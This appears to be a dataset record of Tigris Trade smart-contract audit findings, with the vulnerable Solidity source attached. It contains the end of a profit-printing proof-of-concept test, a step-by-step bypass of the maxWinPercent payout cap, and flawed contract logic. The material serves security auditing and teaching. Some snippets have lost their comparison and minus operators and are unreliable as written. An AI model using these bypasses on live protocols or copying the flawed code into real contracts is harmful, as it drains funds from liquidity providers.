stabletoken.balanceOf(user.address)\n      await stablevault.connect(user).withdraw(MockDAI.address, amount)\n\n      // Print results\n      const daiAtEnd = await mockDAI.balanceOf(user.address)\n      const tenPow18 = \"1000000000000000000\"\n      const diff = (daiAtEnd daiAtBeginning).toString() / tenPow18\n      console.log(Profit: ${diff} DAI)\n    })\n})\n\n\nGainsGoblin (Tigris Trade) confirmed(https://github.com/code-423n4/2022-12-tigris-findings/issues/67) \n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/67#issuecomment-1383681527):\n  The warden has shown how, through the combination of: finding a way to re-trigger the delayCheck, altering SL and TP prices, a trader can prevent their position from being closed, creating the opportunity for riskless trades.\n \n Because of the broken invariants, and the value extraction shown, I agree with High Severity.\n\nGainsGoblin (Tigris Trade) resolved(https://github.com/code-423n4/2022-12-tigris-findings/issues/67#issuecomment-1407130700):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173125 \n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-09",
                "Location": [
                    "//solidity\nFile: 2022-12-tigriscontractsTrading.sol\n624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n625:                 if (maxWinPercent  0 && _toMint  _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit\n626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n627:                 }\n"
                ],
                "Type": " Users can bypass the  maxWinPercent  limit using a partially closing",
                "Description": "*Submitted by hansfriese(https://github.com/code-423n4/2022-12-tigris-findings/issues/507), also found by 0x52(https://github.com/code-423n4/2022-12-tigris-findings/issues/487), 0xA5DF(https://github.com/code-423n4/2022-12-tigris-findings/issues/339), and bin2chen(https://github.com/code-423n4/2022-12-tigris-findings/issues/332)*\n\nUsers can bypass the maxWinPercent limit using a partial closing.\n\nAs a result, users can receive more funds than their upper limit from the protocol.\n\n\nAs we can see from the documentation(https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.\n\n    Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually.\n\nAnd this logic was implemented like below in _closePosition().\n\nsolidity\nFile: 2022-12-tigriscontractsTrading.sol\n624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n625:                 if (maxWinPercent  0 && _toMint  _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit\n626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n627:                 }\n\n\nBut it checks the maxWinPercent between the partial payout and full margin so the below scenario is possible.\n\n1.  Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.\n2.  If maxWinPercent = 500%, Alice should receive 500 at most.\n3.  But Alice closed 50% of the position and she got 500 for a 50% margin because it checks maxWinPercent with _toMint = 500 and _trade.margin = 100\n4.  After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.\n5.  As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.\n\n",
                "Repair": "\nWe should check the maxWinPercent between the partial payout and partial margin like below.\n\nsolidity\n    _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n\n    uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++\n    if (maxWinPercent  0 && _toMint  partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) { \n        _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;\n    }\n\n\nTriHaz (Tigris Trade) confirmed, but disagreed with severity and commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1364949926):\n I would label this as Medium risk as a +500% win is required so assets are not in a direct risk.\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1399445298):\n  The Warden has shown how, by partially closing an order, it is possible to bypass the maxWinPercent cap.\n \n Per similar discussion to #111(https://github.com/code-423n4/2022-12-tigris-findings/issues/111) the fact that not every trade can be above 500% in payout is not a guarantee that some trade will be, and those that will, will cause the invariant to be broken and LPs to be deeper in the red than they should.\n \n Because this causes an immediate gain to the attacker, at a loss for LPs, I agree with High Severity.\n\nGainsGoblin (Tigris Trade) resolved(https://github.com/code-423n4/2022-12-tigris-findings/issues/507#issuecomment-1407802166):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176771 \n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract BondNFT is ERC721Enumerable, Ownable {\n    \n    uint constant private DAY = 24 * 60 * 60;\n\n    struct Bond {\n        uint id;\n        address owner;\n        address asset;\n        uint amount;\n        uint mintEpoch;\n        uint mintTime;\n        uint expireEpoch;\n        uint pending;\n        uint shares;\n        uint period;\n        bool expired;\n    }\n\n    mapping(address => uint256) public epoch;\n    uint private totalBonds;\n    string public baseURI;\n    address public manager;\n    address[] public assets;\n\n    mapping(address => bool) public allowedAsset;\n    mapping(address => uint) private assetsIndex;\n    mapping(uint256 => mapping(address => uint256)) private bondPaid;\n    mapping(address => mapping(uint256 => uint256)) private accRewardsPerShare; // tigAsset => epoch => accRewardsPerShare\n    mapping(uint => Bond) private _idToBond;\n    mapping(address => uint) public totalShares;\n    mapping(address => mapping(address => uint)) public userDebt; // user => tigAsset => amount\n\n    constructor(\n        string memory _setBaseURI,\n        string memory _name,\n        string memory _symbol\n    ) ERC721(_name, _symbol) {\n        baseURI = _setBaseURI;\n    }\n\n    /**\n     * @notice Create a bond\n     * @dev Should only be called by a manager contract\n     * @param _asset tigAsset token to lock\n     * @param _amount tigAsset amount\n     * @param _period time to lock for in days\n     * @param _owner address to receive the bond\n     * @return id ID of the minted bond\n     */\n    function createLock(\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _owner\n    ) external onlyManager() returns(uint id) {\n        require(allowedAsset[_asset], \"!Asset\");\n        unchecked {\n            uint shares = _amount * _period / 365;\n            uint expireEpoch = epoch[_asset] + _period;\n            id = ++totalBonds;\n            totalShares[_asset] += shares;\n            Bond memory _bond = Bond(\n                id,             // id\n                address(0),     // owner\n                _asset,         // tigAsset token\n                _amount,        // tigAsset amount\n                epoch[_asset],  // mint epoch\n                block.timestamp,// mint timestamp\n                expireEpoch,    // expire epoch\n                0,              // pending\n                shares,         // linearly scaling share of rewards\n                _period,        // lock period\n                false           // is expired boolean\n            );\n            _idToBond[id] = _bond;\n            _mint(_owner, _bond);\n        }\n        emit Lock(_asset, _amount, _period, _owner, id);\n    }\n\n    /** \n     * @notice Extend the lock period and/or amount of a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond\n     * @param _asset tigAsset token address\n     * @param _amount amount of tigAsset being added\n     * @param _period days being added to the bond\n     * @param _sender address extending the bond\n     */\n    function extendLock(\n        uint _id,\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _sender\n    ) external onlyManager() {\n        Bond memory bond = idToBond(_id);\n        Bond storage _bond = _idToBond[_id];\n        require(bond.owner == _sender, \"!owner\");\n        require(!bond.expired, \"Expired\");\n        require(bond.asset == _asset, \"!BondAsset\");\n        require(bond.pending == 0);\n        require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n        require(bond.period+_period <= 365, \"MAX PERIOD\");\n        unchecked {\n            uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;\n            uint expireEpoch = block.timestamp/DAY + bond.period + _period;\n            totalShares[bond.asset] += shares-bond.shares;\n            _bond.shares = shares;\n            _bond.amount += _amount;\n            _bond.expireEpoch = expireEpoch;\n            _bond.period += _period;\n            _bond.mintTime = block.timestamp;\n            _bond.mintEpoch = epoch[bond.asset];\n            bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;\n        }\n        emit ExtendLock(_period, _amount, _sender,  _id);\n    }\n\n    /**\n     * @notice Release a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond\n     * @param _releaser address initiating the release of the bond\n     * @return amount amount of tigAsset returned\n     * @return lockAmount amount of tigAsset locked in the bond\n     * @return asset tigAsset token released\n     * @return _owner bond owner\n     */\n    function release(\n        uint _id,\n        address _releaser\n    ) external onlyManager() returns(uint amount, uint lockAmount, address asset, address _owner) {\n        Bond memory bond = idToBond(_id);\n        require(bond.expired, \"!expire\");\n        if (_releaser != bond.owner) {\n            unchecked {\n                require(bond.expireEpoch + 7 < epoch[bond.asset], \"Bond owner priority\");\n            }\n        }\n        amount = bond.amount;\n        unchecked {\n            totalShares[bond.asset] -= bond.shares;\n            (uint256 _claimAmount,) = claim(_id, bond.owner);\n            amount += _claimAmount;\n        }\n        asset = bond.asset;\n        lockAmount = bond.amount;\n        _owner = bond.owner;\n        _burn(_id);\n        emit Release(asset, lockAmount, _owner, _id);\n    }\n    /**\n     * @notice Claim rewards from a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond to claim rewards from\n     * @param _claimer address claiming rewards\n     * @return amount amount of tigAsset claimed\n     * @return tigAsset tigAsset token address\n     */\n    function claim(\n        uint _id,\n        address _claimer\n    ) public onlyManager() returns(uint amount, address tigAsset) {\n        Bond memory bond = idToBond(_id);\n        require(_claimer == bond.owner, \"!owner\");\n        amount = bond.pending;\n        tigAsset = bond.asset;\n        unchecked {\n            if (bond.expired) {\n                uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n                if (totalShares[bond.asset] > 0) {\n                    accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n                }\n            }\n            bondPaid[_id][bond.asset] += amount;\n        }\n        IERC20(tigAsset).transfer(manager, amount);\n        emit ClaimFees(tigAsset, amount, _claimer, _id);\n    }\n\n    /**\n     * @notice Claim user debt left from bond transfer\n     * @dev Should only be called by a manager contract\n     * @param _user user address\n     * @param _tigAsset tigAsset token address\n     * @return amount amount of tigAsset claimed\n     */\n    function claimDebt(\n        address _user,\n        address _tigAsset\n    ) public onlyManager() returns(uint amount) {\n        amount = userDebt[_user][_tigAsset];\n        userDebt[_user][_tigAsset] = 0;\n        IERC20(_tigAsset).transfer(manager, amount);\n        emit ClaimDebt(_tigAsset, amount, _user);\n    }\n\n    /**\n     * @notice Distribute rewards to bonds\n     * @param _tigAsset tigAsset token address\n     * @param _amount tigAsset amount\n     */\n    function distribute(\n        address _tigAsset,\n        uint _amount\n    ) external {\n        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n        IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n        unchecked {\n            uint aEpoch = block.timestamp / DAY;\n            if (aEpoch > epoch[_tigAsset]) {\n                for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                    epoch[_tigAsset] += 1;\n                    accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                }\n            }\n            accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n        }\n        emit Distribution(_tigAsset, _amount);\n    }\n\n    /**\n     * @notice Get all data for a bond\n     * @param _id ID of the bond\n     * @return bond Bond object\n     */\n    function idToBond(uint256 _id) public view returns (Bond memory bond) {\n        bond = _idToBond[_id];\n        bond.owner = ownerOf(_id);\n        bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n        unchecked {\n            uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];\n            bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];\n        }\n    }\n\n    /*\n     * @notice Get expired boolean for a bond\n     * @param _id ID of the bond\n     * @return bool true if bond is expired\n     */\n    function isExpired(uint256 _id) public view returns (bool) {\n        Bond memory bond = _idToBond[_id];\n        return bond.expireEpoch <= epoch[bond.asset] ? true : false;\n    }\n\n    /*\n     * @notice Get pending rewards for a bond\n     * @param _id ID of the bond\n     * @return bool true if bond is expired\n     */\n    function pending(\n        uint256 _id\n    ) public view returns (uint256) {\n        return idToBond(_id).pending;\n    }\n\n    function totalAssets() public view returns (uint256) {\n        return assets.length;\n    }\n\n    /*\n     * @notice Gets an array of all whitelisted token addresses\n     * @return address array of addresses\n     */\n    function getAssets() public view returns (address[] memory) {\n        return assets;\n    }\n\n    function _baseURI() internal override view returns (string memory) {\n        return baseURI;\n    }\n\n    function safeTransferMany(address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                _transfer(_msgSender(), _to, _ids[i]);\n            }\n        }\n    }\n\n    function safeTransferFromMany(address _from, address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                safeTransferFrom(_from, _to, _ids[i]);\n            }\n        }\n    }\n\n    function approveMany(address _to, uint[] calldata _ids) external {\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                approve(_to, _ids[i]);\n            }\n        }\n    }\n\n    function _mint(\n        address to,\n        Bond memory bond\n    ) internal {\n        unchecked {\n            bondPaid[bond.id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * bond.shares / 1e18;\n        }\n        _mint(to, bond.id);\n    }\n\n    function _burn(\n        uint256 _id\n    ) internal override {\n        delete _idToBond[_id];\n        super._burn(_id);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 _id\n    ) internal override {\n        Bond memory bond = idToBond(_id);\n        require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n        require(!bond.expired, \"Expired!\");\n        unchecked {\n            require(block.timestamp > bond.mintTime + 300, \"Recent update\");\n            userDebt[from][bond.asset] += bond.pending;\n            bondPaid[_id][bond.asset] += bond.pending;\n        }\n        super._transfer(from, to, _id);\n    }\n\n    function balanceIds(address _user) public view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](balanceOf(_user));\n        unchecked {\n            for (uint i=0; i<_ids.length; i++) {\n                _ids[i] = tokenOfOwnerByIndex(_user, i);\n            }\n        }\n        return _ids;\n    }\n\n    function addAsset(address _asset) external onlyOwner {\n        require(assets.length == 0 || assets[assetsIndex[_asset]] != _asset, \"Already added\");\n        assetsIndex[_asset] = assets.length;\n        assets.push(_asset);\n        allowedAsset[_asset] = true;\n        epoch[_asset] = block.timestamp/DAY;\n    }\n\n    function setAllowedAsset(address _asset, bool _bool) external onlyOwner {\n        require(assets[assetsIndex[_asset]] == _asset, \"Not added\");\n        allowedAsset[_asset] = _bool;\n    }\n\n    function setBaseURI(string calldata _newBaseURI) external onlyOwner {\n        baseURI = _newBaseURI;\n    }\n\n    function setManager(\n        address _manager\n    ) public onlyOwner() {\n        manager = _manager;\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == manager, \"!manager\");\n        _;\n    }\n\n    event Distribution(address _tigAsset, uint256 _amount);\n    event Lock(address _tigAsset, uint256 _amount, uint256 _period, address _owner, uint256 _id);\n    event ExtendLock(uint256 _period, uint256 _amount, address _owner, uint256 _id);\n    event Release(address _tigAsset, uint256 _amount, address _owner, uint256 _id);\n    event ClaimFees(address _tigAsset, uint256 _amount, address _claimer, uint256 _id);\n    event ClaimDebt(address _tigAsset, uint256 _amount, address _owner);\n}\n\n//SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ninterface IERC721 {\n    function balanceOf(address) external view returns (uint256);\n    function safeTransferMany(address, uint[] memory) external;\n    function claim(address) external;\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function transfer(address, uint) external;\n    function transferFrom(address, address, uint) external;\n}\n\ncontract NFTSale is Ownable {\n\n    uint public price;\n    IERC721 public nft;\n    IERC20 public token;\n\n    uint[] public availableIds;\n\n    constructor (IERC721 _nft, IERC20 _token) {\n        nft = _nft;\n        token = _token;\n    }\n\n\n    function setPrice(uint _price) external onlyOwner {\n        price = _price;\n    }\n\n    function available() external view returns (uint) {\n        return nft.balanceOf(address(this));\n    }\n\n    function buy(uint _amount) external {\n        require(_amount <= availableIds.length, \"Not enough for sale\");\n        uint _tokenAmount = _amount*price;\n        token.transferFrom(msg.sender, owner(), _tokenAmount);\n        uint[] memory _sold = new uint[](_amount);\n        for (uint i=0; i<_amount; i++) {\n            _sold[i] = availableIds[(availableIds.length-i) - 1];\n        }\n        for (uint i=0; i<_amount; i++) {\n            availableIds.pop();\n        }\n        nft.safeTransferMany(msg.sender, _sold);\n    }\n\n    function recovertoken() external {\n        token.transfer(owner(), token.balanceOf(address(this)));\n    }\n\n    function recoverNft() external onlyOwner {\n        nft.safeTransferMany(owner(), availableIds);\n        availableIds = new uint[](0);\n    }\n\n    function setIds(uint[] calldata _ids) external onlyOwner {\n        availableIds = _ids;\n    }\n\n    function claimPendingRev(address _tigAsset) external {\n        nft.claim(_tigAsset);\n        IERC20(_tigAsset).transfer(owner(), IERC20(_tigAsset).balanceOf(address(this)));\n    }\n}\n\n\n//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/ITrading.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./interfaces/IPairsContract.sol\";\nimport \"./interfaces/IReferrals.sol\";\nimport \"./interfaces/IPosition.sol\";\nimport \"./interfaces/IGovNFT.sol\";\nimport \"./interfaces/IStableVault.sol\";\nimport \"./utils/TradingLibrary.sol\";\n\ninterface ITradingExtension {\n    function getVerifiedPrice(\n        uint _asset,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        uint _withSpreadIsLong\n    ) external returns(uint256 _price, uint256 _spread);\n    function getRef(\n        address _trader\n    ) external pure returns(address);\n    function _setReferral(\n        bytes32 _referral,\n        address _trader\n    ) external;\n    function validateTrade(uint _asset, address _tigAsset, uint _margin, uint _leverage) external view;\n    function isPaused() external view returns(bool);\n    function minPos(address) external view returns(uint);\n    function modifyLongOi(\n        uint _asset,\n        address _tigAsset,\n        bool _onOpen,\n        uint _size\n    ) external;\n    function modifyShortOi(\n        uint _asset,\n        address _tigAsset,\n        bool _onOpen,\n        uint _size\n    ) external;\n    function paused() external returns(bool);\n    function _limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) external returns(uint _limitPrice, address _tigAsset);\n    function _checkGas() external view;\n    function _closePosition(\n        uint _id,\n        uint _price,\n        uint _percent\n    ) external returns (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout);\n}\n\ninterface IStable is IERC20 {\n    function burnFrom(address account, uint amount) external;\n    function mintFor(address account, uint amount) external;\n}\n\ninterface ExtendedIERC20 is IERC20 {\n    function decimals() external view returns (uint);\n}\n\ninterface ERC20Permit is IERC20 {\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\ncontract Trading is MetaContext, ITrading {\n\n    error LimitNotSet(); //7\n    error NotLiquidatable();\n    error TradingPaused();\n    error BadDeposit();\n    error BadWithdraw();\n    error ValueNotEqualToMargin();\n    error BadLeverage();\n    error NotMargin();\n    error NotAllowedPair();\n    error BelowMinPositionSize();\n    error BadClosePercent();\n    error NoPrice();\n    error LiqThreshold();\n\n    uint constant private DIVISION_CONSTANT = 1e10; // 100%\n    uint private constant liqPercent = 9e9; // 90%\n\n    struct Fees {\n        uint daoFees;\n        uint burnFees;\n        uint referralFees;\n        uint botFees;\n    }\n    Fees public openFees = Fees(\n        0,\n        0,\n        0,\n        0\n    );\n    Fees public closeFees = Fees(\n        0,\n        0,\n        0,\n        0\n    );\n    uint public limitOrderPriceRange = 1e8; // 1%\n\n    uint public maxWinPercent;\n    uint public vaultFundingPercent;\n\n    IPairsContract private pairsContract;\n    IPosition private position;\n    IGovNFT private gov;\n    ITradingExtension private tradingExtension;\n\n    struct Delay {\n        uint delay; // Block number where delay ends\n        bool actionType; // True for open, False for close\n    }\n    mapping(uint => Delay) public blockDelayPassed; // id => Delay\n    uint public blockDelay;\n    mapping(uint => uint) public limitDelay; // id => block.timestamp\n\n    mapping(address => bool) public allowedVault;\n\n    struct Proxy {\n        address proxy;\n        uint256 time;\n    }\n\n    mapping(address => Proxy) public proxyApprovals;\n\n    constructor(\n        address _position,\n        address _gov,\n        address _pairsContract\n    )\n    {\n        position = IPosition(_position);\n        gov = IGovNFT(_gov);\n        pairsContract = IPairsContract(_pairsContract);\n    }\n\n    // ===== END-USER FUNCTIONS =====\n\n    /**\n     * @param _tradeInfo Trade info\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function initiateMarketOrder(\n        TradeInfo calldata _tradeInfo,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkDelay(position.getCount(), true);\n        _checkVault(_tradeInfo.stableVault, _tradeInfo.marginAsset);\n        address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n        tradingExtension.validateTrade(_tradeInfo.asset, _tigAsset, _tradeInfo.margin, _tradeInfo.leverage);\n        tradingExtension._setReferral(_tradeInfo.referral, _trader);\n        uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\n        uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n        _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n        uint256 _isLong = _tradeInfo.direction ? 1 : 2;\n        (uint256 _price,) = tradingExtension.getVerifiedPrice(_tradeInfo.asset, _priceData, _signature, _isLong);\n        IPosition.MintTrade memory _mintTrade = IPosition.MintTrade(\n            _trader,\n            _marginAfterFees,\n            _tradeInfo.leverage,\n            _tradeInfo.asset,\n            _tradeInfo.direction,\n            _price,\n            _tradeInfo.tpPrice,\n            _tradeInfo.slPrice,\n            0,\n            _tigAsset\n        );\n        _checkSl(_tradeInfo.slPrice, _tradeInfo.direction, _price);\n        unchecked {\n            if (_tradeInfo.direction) {\n                tradingExtension.modifyLongOi(_tradeInfo.asset, _tigAsset, true, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_tradeInfo.asset, _tigAsset, true, _positionSize);\n            }\n        }\n        _updateFunding(_tradeInfo.asset, _tigAsset);\n        position.mint(\n            _mintTrade\n        );\n        unchecked {\n            emit PositionOpened(_tradeInfo, 0, _price, position.getCount()-1, _trader, _marginAfterFees);\n        }   \n    }\n\n    /**\n     * @dev initiate closing position\n     * @param _id id of the position NFT\n     * @param _percent percent of the position being closed in BP\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _stableVault StableVault address\n     * @param _outputToken Token received upon closing trade\n     * @param _trader address the trade is initiated for\n     */\n    function initiateCloseOrder(\n        uint _id,\n        uint _percent,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _stableVault,\n        address _outputToken,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkDelay(_id, false);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _outputToken);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit        \n        (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n\n        if (_percent > DIVISION_CONSTANT || _percent == 0) revert BadClosePercent();\n        _closePosition(_id, _percent, _price, _stableVault, _outputToken, false); \n    }\n\n    /**\n     * @param _id position id\n     * @param _addMargin margin amount used to add to the position\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _stableVault StableVault address\n     * @param _marginAsset Token being used to add to the position\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function addToPosition(\n        uint _id,\n        uint _addMargin,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _stableVault,\n        address _marginAsset,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkDelay(_id, true);\n        IPosition.Trade memory _trade = position.trades(_id);\n        tradingExtension.validateTrade(_trade.asset, _trade.tigAsset, _trade.margin + _addMargin, _trade.leverage);\n        _checkVault(_stableVault, _marginAsset);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\n        _handleDeposit(\n            _trade.tigAsset,\n            _marginAsset,\n            _addMargin - _fee,\n            _stableVault,\n            _permitData,\n            _trader\n        );\n        position.setAccInterest(_id);\n        unchecked {\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, _trade.direction ? 1 : 2);\n            uint _positionSize = (_addMargin - _fee) * _trade.leverage / 1e18;\n            if (_trade.direction) {\n                tradingExtension.modifyLongOi(_trade.asset, _trade.tigAsset, true, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_trade.asset, _trade.tigAsset, true, _positionSize);     \n            }\n            _updateFunding(_trade.asset, _trade.tigAsset);\n            _addMargin -= _fee;\n            uint _newMargin = _trade.margin + _addMargin;\n            uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n\n            position.addToPosition(\n                _trade.id,\n                _newMargin,\n                _newPrice\n            );\n            \n            emit AddToPosition(_trade.id, _newMargin, _newPrice, _trade.trader);\n        }\n    }\n\n    /**\n     * @param _tradeInfo Trade info\n     * @param _orderType type of limit order used to open the position\n     * @param _price limit price\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function initiateLimitOrder(\n        TradeInfo calldata _tradeInfo,\n        uint256 _orderType, // 1 limit, 2 stop\n        uint256 _price,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n        tradingExtension.validateTrade(_tradeInfo.asset, _tigAsset, _tradeInfo.margin, _tradeInfo.leverage);\n        _checkVault(_tradeInfo.stableVault, _tradeInfo.marginAsset);\n        if (_orderType == 0) revert(\"5\");\n        if (_price == 0) revert NoPrice();\n        tradingExtension._setReferral(_tradeInfo.referral, _trader);\n        _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n        _checkSl(_tradeInfo.slPrice, _tradeInfo.direction, _price);\n        uint256 _id = position.getCount();\n        position.mint(\n            IPosition.MintTrade(\n                _trader,\n                _tradeInfo.margin,\n                _tradeInfo.leverage,\n                _tradeInfo.asset,\n                _tradeInfo.direction,\n                _price,\n                _tradeInfo.tpPrice,\n                _tradeInfo.slPrice,\n                _orderType,\n                _tigAsset\n            )\n        );\n        limitDelay[_id] = block.timestamp + 4;\n        emit PositionOpened(_tradeInfo, _orderType, _price, _id, _trader, _tradeInfo.margin);\n    }\n\n    /**\n     * @param _id position ID\n     * @param _trader address the trade is initiated for\n     */\n    function cancelLimitOrder(\n        uint256 _id,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType == 0) revert();\n        IStable(_trade.tigAsset).mintFor(_trader, _trade.margin);\n        position.burn(_id);\n        emit LimitCancelled(_id, _trader);\n    }\n\n    /**\n     * @param _id position id\n     * @param _marginAsset Token being used to add to the position\n     * @param _stableVault StableVault address\n     * @param _addMargin margin amount being added to the position\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function addMargin(\n        uint256 _id,\n        address _marginAsset,\n        address _stableVault,\n        uint256 _addMargin,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _marginAsset);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(); //IsLimit\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_trade.asset);\n        _handleDeposit(_trade.tigAsset, _marginAsset, _addMargin, _stableVault, _permitData, _trader);\n        unchecked {\n            uint256 _newMargin = _trade.margin + _addMargin;\n            uint256 _newLeverage = _trade.margin * _trade.leverage / _newMargin;\n            if (_newLeverage < asset.minLeverage) revert(\"!lev\");\n            position.modifyMargin(_id, _newMargin, _newLeverage);\n            emit MarginModified(_id, _newMargin, _newLeverage, true, _trader);\n        }\n    }\n\n    /**\n     * @param _id position id\n     * @param _stableVault StableVault address\n     * @param _outputToken token the trader will receive\n     * @param _removeMargin margin amount being removed from the position\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node 